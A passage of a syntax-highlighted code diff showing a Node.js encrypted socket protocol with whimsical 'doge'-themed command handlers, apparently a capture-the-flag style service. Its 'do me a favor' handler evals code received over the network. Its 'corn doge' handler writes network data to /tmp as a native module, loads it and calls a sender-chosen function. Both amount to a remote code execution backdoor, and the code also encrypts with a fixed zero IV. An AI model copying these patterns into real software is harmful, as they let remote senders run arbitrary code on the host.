+                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>.<span style="color:#a6e22e">shift</span>();
+            } <span style="color:#66d9ef">else</span> {
+                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">copy</span>(<span style="color:#a6e22e">result</span>, <span style="color:#a6e22e">offset</span>, <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">size</span>);
+                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">slice</span>(<span style="color:#a6e22e">size</span>);
+            }
+            <span style="color:#a6e22e">size</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">length</span>;
+        }
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
+    };
+    <span style="color:#a6e22e">_getHeader</span>() {
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">stupid</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_hasEnough</span>(<span style="color:#ae81ff">4</span>);
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stupid</span>) {
+            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_payloadLength</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_readBytes</span>(<span style="color:#ae81ff">4</span>).<span style="color:#a6e22e">readUInt32BE</span>(<span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">true</span>);
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;payload length set to: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">payloadLength</span>)
+            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_state</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;PAYLOAD&#39;</span>;
+        }
+    };
+    <span style="color:#a6e22e">_getPayload</span>() {
+
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">stupid</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_hasEnough</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_payloadLength</span>);
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stupid</span>) {
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Oh yeah, it&#39;s stupid&#34;</span>)
+            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">received</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_readBytes</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_payloadLength</span>);
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Recieved: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">received</span>)
+            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_parseMessage</span>(<span style="color:#a6e22e">received</span>);
+            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_state</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;HEADER&#39;</span>;
+        }
+    };
+    <span style="color:#a6e22e">_onData</span>(<span style="color:#a6e22e">data</span>) {
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;parsing data: &#34;</span>);
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">data</span>)
+        <span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_process</span>) {
+            <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_state</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;HEADER&#39;</span>) {
+                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_getHeader</span>();
+            }
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Its a payload!&#34;</span>)
+            <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_state</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;PAYLOAD&#39;</span>) {
+                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_getPayload</span>();
+            }
+        }
+    };
+    <span style="color:#a6e22e">_encrypt</span>(<span style="color:#a6e22e">data</span>) {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">iv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">alloc</span>(<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">0</span>);
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wow_cripter</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createCipheriv</span>(<span style="color:#e6db74">&#39;aes-128-cbc&#39;</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">aes_key</span>, <span style="color:#a6e22e">iv</span>);
+        <span style="color:#a6e22e">wow_cripter</span>.<span style="color:#a6e22e">setAutoPadding</span>(<span style="color:#66d9ef">true</span>);
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">concat</span>([<span style="color:#a6e22e">wow_cripter</span>.<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">data</span>), <span style="color:#a6e22e">wow_cripter</span>.<span style="color:#66d9ef">final</span>()]);
+    };
+    <span style="color:#a6e22e">_decrypt</span>(<span style="color:#a6e22e">data</span>) {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">iv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">alloc</span>(<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">0</span>);
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wow_decripter</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createDecipheriv</span>(<span style="color:#e6db74">&#39;aes-128-cbc&#39;</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">aes_key</span>, <span style="color:#a6e22e">iv</span>);
+        <span style="color:#a6e22e">wow_decripter</span>.<span style="color:#a6e22e">setAutoPadding</span>(<span style="color:#66d9ef">true</span>);
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">concat</span>([<span style="color:#a6e22e">wow_decripter</span>.<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">data</span>), <span style="color:#a6e22e">wow_decripter</span>.<span style="color:#66d9ef">final</span>()]);
+    };
+    <span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">message</span>) {
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">hmac</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createHmac</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">hmac_key</span>);
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">mbuf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_encrypt</span>(<span style="color:#a6e22e">message</span>);
+        <span style="color:#a6e22e">hmac</span>.<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">mbuf</span>);
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">chksum</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hmac</span>.<span style="color:#a6e22e">digest</span>();
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">concat</span>([<span style="color:#a6e22e">chksum</span>, <span style="color:#a6e22e">mbuf</span>]);
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_header</span>(<span style="color:#a6e22e">buffer</span>.<span style="color:#a6e22e">length</span>);
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_packet</span>.<span style="color:#a6e22e">message</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">buffer</span>;
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_send</span>();
+    };
+    <span style="color:#a6e22e">_parseMessage</span>(<span style="color:#a6e22e">received</span>) {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hmac</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createHmac</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">hmac_key</span>);
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;parseMessage_recieved: &#39;</span>);
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">received</span>)
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">checksum</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">received</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">32</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;hex&#39;</span>);
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;parseMessage_checksum: &#39;</span>);
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">checksum</span>);
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">message</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">received</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">32</span>);
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;parseMessage_message: &#34;</span>);
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">message</span>);
+        <span style="color:#a6e22e">hmac</span>.<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">message</span>);
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">stupid</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hmac</span>.<span style="color:#a6e22e">digest</span>(<span style="color:#e6db74">&#39;hex&#39;</span>);
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;stupid: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">stupid</span>);
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checksum</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">stupid</span>) {
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;oh yes it&#39;s VERY VERY stupid!&#34;</span>)
+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">dec_message</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_decrypt</span>(<span style="color:#a6e22e">message</span>);
+            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#39;served&#39;</span>, <span style="color:#a6e22e">dec_message</span>);
+        }
+    };
+    <span style="color:#a6e22e">_header</span>(<span style="color:#a6e22e">messageLength</span>) {
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_packet</span>.<span style="color:#a6e22e">header</span> <span style="color:#f92672">=</span> {
+            <span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">messageLength</span>
+        };
+    };
+    <span style="color:#a6e22e">_send</span>() {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">contentLength</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">allocUnsafe</span>(<span style="color:#ae81ff">4</span>);
+        <span style="color:#a6e22e">contentLength</span>.<span style="color:#a6e22e">writeUInt32BE</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_packet</span>.<span style="color:#a6e22e">header</span>.<span style="color:#a6e22e">length</span>);
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">contentLength</span>);
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">write</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_packet</span>.<span style="color:#a6e22e">message</span>);
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_packet</span> <span style="color:#f92672">=</span> {};
+    };
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">cript</span>(<span style="color:#a6e22e">input</span>, <span style="color:#a6e22e">key</span>) {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">alloc</span>(<span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">length</span>);
+    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">length</span>) {
+        <span style="color:#a6e22e">key</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">key</span>;
+    }
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ib</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">input</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">kb</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">key</span>);
+    <span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#a6e22e">c</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ib</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">^</span> <span style="color:#a6e22e">kb</span>[<span style="color:#a6e22e">i</span>]
+    }
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">toString</span>();
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">dogeParam</span>(<span style="color:#a6e22e">buffer</span>) {
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;dogeParam invoked!&#34;</span>)
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doge_command</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dson</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">buffer</span>);
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;We parsed a doge command&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">buffer</span>)
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doge_response</span> <span style="color:#f92672">=</span> {};
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#e6db74">&#39;dogesez&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">doge_command</span>)) {
+        <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bonk&#39;</span>;
+        <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;shibe&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;doge not sez&#39;</span>;
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">dson</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">doge_response</span>);
+    }
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">doge_command</span>.<span style="color:#a6e22e">dogesez</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;ping&#39;</span>) {
+        <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;pong&#39;</span>;
+        <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;ohmaze&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">doge_command</span>.<span style="color:#a6e22e">ohmaze</span>;
+    }
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">doge_command</span>.<span style="color:#a6e22e">dogesez</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;do me a favor&#39;</span>) {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">favor</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">undefined</span>;
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doge</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">undefined</span>;
+        <span style="color:#66d9ef">try</span> {
+            <span style="color:#a6e22e">doge</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dogescript</span>(<span style="color:#a6e22e">doge_command</span>.<span style="color:#a6e22e">ohmaze</span>);
+            <span style="color:#a6e22e">favor</span> <span style="color:#f92672">=</span> eval(<span style="color:#a6e22e">doge</span>);
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;welcome&#39;</span>;
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;ohmaze&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">favor</span>;
+        } <span style="color:#66d9ef">catch</span> {
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bonk&#39;</span>;
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;shibe&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;doge sez no&#39;</span>;
+        }
+    }
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">doge_command</span>.<span style="color:#a6e22e">dogesez</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;corn doge&#39;</span>) {
+        <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">!</span>(<span style="color:#e6db74">&#39;batter&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">doge_command</span>) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>(<span style="color:#e6db74">&#39;sausage&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">doge_command</span>))) {
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;dnt cunsoome&#39;</span>;
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;shibe&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;corn doge no batter or sausage&#39;</span>;
+            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">dson</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">doge_response</span>);
+        }
+
+        <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">!</span>(<span style="color:#e6db74">&#39;meat&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">doge_command</span>[<span style="color:#e6db74">&#39;sausage&#39;</span>]) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>(<span style="color:#e6db74">&#39;flavor&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">doge_command</span>[<span style="color:#e6db74">&#39;sausage&#39;</span>]))) {
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;dnt cunsoome&#39;</span>;
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;shibe&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sausage no meat or flavor&#39;</span>;
+            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">dson</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">doge_response</span>);
+        }
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stupid</span> <span style="color:#f92672">=</span> Array.<span style="color:#a6e22e">isArray</span>(<span style="color:#a6e22e">doge_command</span>[<span style="color:#e6db74">&#39;sausage&#39;</span>][<span style="color:#e6db74">&#39;flavor&#39;</span>]);
+        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">stupid</span>) {
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;dnt cunsoome&#39;</span>;
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;shibe&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flavor giv not levl&#39;</span>;
+            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">dson</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">doge_response</span>);
+        }
+
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stupidtoo</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">doge_command</span>.<span style="color:#a6e22e">batter</span>, <span style="color:#e6db74">&#39;base64&#39;</span>)
+            .<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;base64&#39;</span>);
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stupidtoo</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">doge_command</span>.<span style="color:#a6e22e">batter</span>) {
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;eated&#39;</span>;
+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">meat</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">doge_command</span>[<span style="color:#e6db74">&#39;sausage&#39;</span>][<span style="color:#e6db74">&#39;meat&#39;</span>];
+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flavor</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">doge_command</span>[<span style="color:#e6db74">&#39;sausage&#39;</span>][<span style="color:#e6db74">&#39;flavor&#39;</span>];
+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doge_carnval</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">doge_command</span>.<span style="color:#a6e22e">batter</span>, <span style="color:#e6db74">&#39;base64&#39;</span>);
+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">randome</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">random</span>()
+                .<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">36</span>)
+                .<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">9</span>)
+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/tmp/corndoge-&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">randome</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.node&#39;</span>;
+            <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#a6e22e">filename</span>, <span style="color:#a6e22e">doge_carnval</span>);
+            <span style="color:#66d9ef">try</span> {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doge_module</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#39;</span>);
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">retval</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">doge_module</span>[<span style="color:#a6e22e">meat</span>](...<span style="color:#a6e22e">flavor</span>);
+                <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;taste&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">retval</span>;
+            } <span style="color:#66d9ef">catch</span> {
+                <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bonk&#39;</span>;
+                <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;shibe&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bad corn doge&#39;</span>;
+            } <span style="color:#66d9ef">finally</span> {
+                <span style="color:#66d9ef">delete</span> <span style="color:#a6e22e">require</span>.<span style="color:#a6e22e">cache</span>[<span style="color:#a6e22e">require</span>.<span style="color:#a6e22e">resolve</span>(<span style="color:#a6e22e">filename</span>)]
+            };
+        } <span style="color:#66d9ef">else</span> {
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;dnt cunsoome&#39;</span>;
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;shibe&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;all bout base six fur&#39;</span>;
+        }
+    }
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">doge_command</span>.<span style="color:#a6e22e">dogesez</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;hot doge&#39;</span>) {
+        <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">!</span>(<span style="color:#e6db74">&#39;bread&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">doge_command</span>) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>(<span style="color:#e6db74">&#39;sausage&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">doge_command</span>))) {
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;dnt cunsoome&#39;</span>;
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;shibe&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hot doge no bread or sausage&#39;</span>;
+            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">dson</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">doge_response</span>);
+        }
+
+        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#e6db74">&#39;flavor&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">doge_command</span>[<span style="color:#e6db74">&#39;sausage&#39;</span>]) {
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;dnt cunsoome&#39;</span>;
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;shibe&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sausage no flavor&#39;</span>;
+            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">dson</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">doge_response</span>);
+        }
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stupid</span> <span style="color:#f92672">=</span> Array.<span style="color:#a6e22e">isArray</span>(<span style="color:#a6e22e">doge_command</span>[<span style="color:#e6db74">&#39;sausage&#39;</span>][<span style="color:#e6db74">&#39;flavor&#39;</span>]);
+        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">stupid</span>) {
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;dogesez&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;dnt cunsoome&#39;</span>;
+            <span style="color:#a6e22e">doge_response</span>[<span style="color:#e6db74">&#39;shibe&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flavor giv not levl&#39;</span>;
+            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">dson</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">doge_response</span>);
+        }
+
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stupidtoo</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">doge_command</span>.<span style="color:#a6e22e">bread</span>, <span style="color:#e6db74">&#39;base64&#39;</span>)
